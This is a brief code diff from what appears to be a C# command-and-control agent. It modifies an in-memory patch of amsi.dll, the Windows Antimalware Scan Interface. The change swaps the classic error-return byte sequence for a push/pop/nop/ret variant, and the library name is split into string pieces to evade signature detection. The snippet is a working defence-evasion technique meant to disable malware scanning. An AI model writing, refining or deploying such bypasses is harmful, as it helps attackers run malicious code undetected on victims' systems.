@@ -15,7 +15,7 @@ namespace Agent.Commands
         {
             //untested
             byte[] patch;
-            patch = new byte[6] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            patch = new byte[6] { 0x50, 0x58, 0x53, 0x5B, 0x90, 0xC3 };
             try
             {
                 string libName = "a" + "msi" + ".dll";
